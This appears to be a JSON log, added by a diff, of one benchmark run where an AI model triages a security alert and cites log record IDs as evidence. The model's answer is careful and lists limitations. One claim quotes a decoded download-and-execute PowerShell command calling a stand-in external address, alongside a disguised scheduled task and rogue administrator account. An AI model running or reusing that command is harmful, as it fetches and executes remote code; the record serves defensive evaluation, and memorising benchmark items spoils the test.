@@ -1,0 +1,93 @@
+{
+ "run_id": "A__T047__C1__20261115T045942Z",
+ "config": "A",
+ "scenario_id": "T047",
+ "condition": "C1",
+ "model": "gpt-6-luna",
+ "n_records_in_view": 179,
+ "system": "You are a security investigator reviewing an alert. Base every claim only on the evidence available to you. Cite the record IDs that support each observation.",
+ "task_chars": 74367,
+ "attempts": [
+  {
+   "answer": "{\n  \"assessment\": \"malicious\",\n  \"confidence\": 0.99,\n  \"supporting_observations\": [\n    {\n      \"claim\": \"A successful Remote Desktop logon (LogonType 10) to WS-LMARTINS-01 as sam.okafor came from 203.0.113.250, an external address rather than the listed internal workstation network.\",\n      \"claim_type\": \"observed_fact\",\n      \"record_ids\": [\"T047-00060\", \"T047-00063\", \"T047-00064\", \"T047-00065\"]\n    },\n    {\n      \"claim\": \"The account sysmaint was created by sam.okafor and then added to the group logged as Administrators.\",\n      \"claim_type\": \"observed_fact\",\n      \"record_ids\": [\"T047-00081\", \"T047-00082\"]\n    },\n    {\n      \"claim\": \"In the sam.okafor session logged on to WS-LMARTINS-01, a scheduled task named Microsoft\\\\Windows\\\\HealthCheck was created to start immediately. Its action runs hidden PowerShell with an encoded command that decodes to `IEX (iwr http://203.0.113.250/a.ps1)`.\",\n      \"claim_type\": \"observed_fact\",\n      \"record_ids\": [\"T047-00065\", \"T047-00083\"]\n    },\n    {\n      \"claim\": \"The task's download-and-execute command and the external RDP source share the address 203.0.113.250; together with the unauthorized remote administration and privileged account creation, this strongly supports malicious activity.\",\n      \"claim_type\": \"inferred_claim\",\n      \"record_ids\": [\"T047-00063\", \"T047-00065\", \"T047-00081\", \"T047-00082\", \"T047-00083\"]\n    }\n  ],\n  \"known_telemetry_limitations\": [\n    \"The evidence shows scheduled-task creation and its configured command, but does not show whether the task ran or whether the script was downloaded or executed.\",\n    \"The account creation event's SubjectLogonId is 0xcb3d075, whereas the RDP session on WS-LMARTINS-01 has LogonId 0x34cf8fb; the supplied records do not directly link the account-management event to that RDP session.\",\n    \"The records do not establish who controlled the external IP address or whether sam.okafor's credentials were compromised.\"\n  ],\n  \"claims_not_established\": [\n    \"Whether sysmaint was authorized or used after creation.\",\n    \"Whether the scheduled task executed and what the downloaded script contained or did.\",\n    \"Whether sam.okafor personally performed these actions or an unauthorized actor used the account.\"\n  ],\n  \"recommended_action\": \"escalate\",\n  \"additional_evidence_needed\": [\n    \"Collect WS-LMARTINS-01 task execution, PowerShell, process creation, and outbound network telemetry around and after 13:43 UTC.\",\n    \"Retrieve the task and any downloaded script or related files, including available file hashes and contents.\",\n    \"Review DC-NWD-01 account-management and authentication logs for the origin and session associated with SubjectLogonId 0xcb3d075.\",\n    \"Validate the RDP source and session with network, firewall, and identity-provider records, and confirm with sam.okafor whether the activity was authorized.\",\n    \"Review sysmaint's subsequent logons, group memberships, and actions, and preserve evidence before containment.\"\n  ]\n}",
+   "valid": true,
+   "validation_errors": [],
+   "model_returned": "gpt-6-luna",
+   "finish_reason": "stop",
+   "usage": {
+    "input": 27873,
+    "output": 1912,
+    "reasoning": 1152
+   }
+  }
+ ],
+ "error": null,
+ "parsed": {
+  "assessment": "malicious",
+  "confidence": 0.99,
+  "supporting_observations": [
+   {
+    "claim": "A successful Remote Desktop logon (LogonType 10) to WS-LMARTINS-01 as sam.okafor came from 203.0.113.250, an external address rather than the listed internal workstation network.",
+    "claim_type": "observed_fact",
+    "record_ids": [
+     "T047-00060",
+     "T047-00063",
+     "T047-00064",
+     "T047-00065"
+    ]
+   },
+   {
+    "claim": "The account sysmaint was created by sam.okafor and then added to the group logged as Administrators.",
+    "claim_type": "observed_fact",
+    "record_ids": [
+     "T047-00081",
+     "T047-00082"
+    ]
+   },
+   {
+    "claim": "In the sam.okafor session logged on to WS-LMARTINS-01, a scheduled task named Microsoft\\Windows\\HealthCheck was created to start immediately. Its action runs hidden PowerShell with an encoded command that decodes to `IEX (iwr http://203.0.113.250/a.ps1)`.",
+    "claim_type": "observed_fact",
+    "record_ids": [
+     "T047-00065",
+     "T047-00083"
+    ]
+   },
+   {
+    "claim": "The task's download-and-execute command and the external RDP source share the address 203.0.113.250; together with the unauthorized remote administration and privileged account creation, this strongly supports malicious activity.",
+    "claim_type": "inferred_claim",
+    "record_ids": [
+     "T047-00063",
+     "T047-00065",
+     "T047-00081",
+     "T047-00082",
+     "T047-00083"
+    ]
+   }
+  ],
+  "known_telemetry_limitations": [
+   "The evidence shows scheduled-task creation and its configured command, but does not show whether the task ran or whether the script was downloaded or executed.",
+   "The account creation event's SubjectLogonId is 0xcb3d075, whereas the RDP session on WS-LMARTINS-01 has LogonId 0x34cf8fb; the supplied records do not directly link the account-management event to that RDP session.",
+   "The records do not establish who controlled the external IP address or whether sam.okafor's credentials were compromised."
+  ],
+  "claims_not_established": [
+   "Whether sysmaint was authorized or used after creation.",
+   "Whether the scheduled task executed and what the downloaded script contained or did.",
+   "Whether sam.okafor personally performed these actions or an unauthorized actor used the account."
+  ],
+  "recommended_action": "escalate",
+  "additional_evidence_needed": [
+   "Collect WS-LMARTINS-01 task execution, PowerShell, process creation, and outbound network telemetry around and after 13:43 UTC.",
+   "Retrieve the task and any downloaded script or related files, including available file hashes and contents.",
+   "Review DC-NWD-01 account-management and authentication logs for the origin and session associated with SubjectLogonId 0xcb3d075.",
+   "Validate the RDP source and session with network, firewall, and identity-provider records, and confirm with sam.okafor whether the activity was authorized.",
+   "Review sysmaint's subsequent logons, group memberships, and actions, and preserve evidence before containment."
+  ]
+ },
+ "status": "VALID",
+ "faithfulness_precheck": {
+  "n_cited": 13,
+  "n_missing": 0,
+  "missing": []
+ },
+ "duration_s": 18.5
+}
